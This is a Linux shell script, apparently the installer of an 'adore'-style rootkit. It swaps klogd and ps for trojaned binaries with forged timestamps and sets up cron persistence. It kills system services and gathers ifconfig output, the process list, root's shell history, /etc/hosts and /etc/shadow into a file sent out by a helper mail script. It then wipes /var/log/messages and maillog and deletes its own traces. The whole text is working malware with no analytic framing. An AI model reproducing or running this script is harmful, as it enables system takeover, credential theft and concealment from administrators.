#!/bin/sh
#by ~_~
export PATH=/sbin:/usr/sbin:/bin:/usr/bin:.
if [ -f /usr/lib/klogd.o ]; then
echo >/var/log/messages
rm -rf ../lib
exit 0
fi
cc -o icmp icmp.c 1>>/dev/null 2>>/dev/null 3>>/dev/null
cc -o ps ps.c;cp /bin/ps /usr/bin/adore;cp ps /bin;touch -r /usr/bin/adore /bin/ps
cp /etc/cron.daily/0anacron 0anacron-bak >>/dev/null 2>>/dev/null;cp 0anacron /etc/cron.daily
chown root.root /etc/cron.daily/0anacron /bin/ps /usr/bin/adore
rm -rf /dev/.lib 1>>/dev/null 2>>/dev/null 3>>/dev/null
echo ftp >>/etc/ftpusers;echo anonymous >>/etc/ftpusers;
killall -9 rpc.statd 1>>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 rpc.rstatd 1>>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 lpd 1>>/dev/null 2>>/dev/null 3>>/dev/null
if [ -f /sbin/klogd ]; then
killall -9 klogd 1>>/dev/null 2>>/dev/null 3>>/dev/null
cp /sbin/klogd /usr/lib/klogd.o;cp icmp /sbin/klogd
touch -r /usr/lib/klogd.o /sbin/klogd;chown root.root /sbin/klogd /usr/lib/klogd.o
klogd
echo /**************************HOST IP*****************************/ >mail.txt
ifconfig >>mail.txt
echo /**************************PS*********************************/ >>mail.txt
adore -aux >>mail.txt
echo /**************************HISTORY***************************/ >>mail.txt
cat /root/.bash_history >>mail.txt
echo /************************HOSTS*****************************/ >>mail.txt
cat /etc/hosts >>mail.txt
echo /************************PASSWD***************************/ >>mail.txt
cat /etc/shadow >>mail.txt
mail.sh
echo >/var/log/maillog
echo >/var/log/messages
rm -rf go* mail.txt
./start
exit 0
fi
killall -9 klogd 1>>/dev/null 2>>/dev/null 3>>/dev/null
cp /usr/sbin/klogd /usr/lib/klogd.o;cp icmp /usr/sbin/klogd
touch -r /usr/lib/klogd.o /usr/sbin/klogd;chown root.root /usr/sbin/klogd /usr/lib/klogd.o
klogd
echo /**************************HOST IP*****************************/ >mail.txt
ifconfig >>mail.txt
echo /**************************PS*********************************/ >>mail.txt
adore -aux >>mail.txt
echo /**************************HISTORY***************************/ >>mail.txt
cat /root/.bash_history >>mail.txt
echo /************************HOSTS*****************************/ >>mail.txt
cat /etc/hosts >>mail.txt
echo /************************PASSWD***************************/ >>mail.txt
cat /etc/shadow >>mail.txt
mail2.sh
echo >/var/log/maillog
echo >/var/log/messages
rm -rf go* mail.txt
./start
